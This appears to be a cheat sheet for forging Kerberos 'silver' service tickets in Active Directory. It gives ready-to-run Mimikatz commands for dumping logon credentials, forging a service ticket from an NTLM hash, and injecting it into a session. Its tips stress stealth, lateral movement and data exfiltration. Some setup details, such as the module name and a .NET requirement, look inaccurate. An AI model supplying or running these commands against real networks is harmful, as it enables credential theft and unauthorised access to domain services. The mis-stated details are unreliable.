# SilverTicket

**Type:** Active Directory / Kerberos Attack Tool
**Focus:** Forging Kerberos service tickets for lateral movement

---

## 1. Full Feature Overview

* Generates forged Kerberos service tickets (TGS)
* Exploits weak service account hashes to access services without needing a domain controller
* Enables access to specific services like SMB, HTTP, MSSQL
* Does not require domain controller communication at ticket creation
* Part of penetration testing suites for AD attacks
* Can be combined with Mimikatz or Rubeus for ticket management

---

## 2. Requirements & Setup

### Requirements

* Windows environment (or via Wine on Linux)
* .NET Framework 4.x
* Administrative privileges or access to service account hash

### Installation

* Part of Mimikatz (`sekurlsa::kerberos` module)
* Alternatively, standalone tools/scripts can be found in Pentest AD repos

---

## 3. Core Usage

### 3.1 Using Mimikatz

```text
# Launch mimikatz
privilege::debug
sekurlsa::logonpasswords
kerberos::list /export
```

### 3.2 Generate Silver Ticket

```text
# Forging TGS for a service
kerberos::golden /user:TargetUser /rc4:<NTLM_HASH> /domain:domain.local /sid:S-1-5-21-xxxx /service:cifs /target:TargetHost
```

### 3.3 Inject Ticket

```text
# Inject into current session
kerberos::ptt ticket.kirbi
```

---

## 4. Tips, Tricks, Best Practices

* Silver tickets bypass DC authentication checks; useful for stealth
* Ensure the SPN (`service/target`) matches exactly or access will fail
* Combine with tools like Rubeus to automate ticket creation
* Use for lateral movement, service enumeration, or data exfiltration
* Always validate generated ticket against service using `klist`

---

## 5. Cheat Sheet

```text
# Launch Mimikatz
privilege::debug

# List logon credentials
sekurlsa::logonpasswords

# Generate Silver Ticket
kerberos::golden /user:TargetUser /rc4:<NTLM_HASH> /domain:domain.local /sid:S-1-5-21-xxxx /service:cifs /target:TargetHost

# Inject Ticket
kerberos::ptt ticket.kirbi

# Verify Ticket
klist
```

---
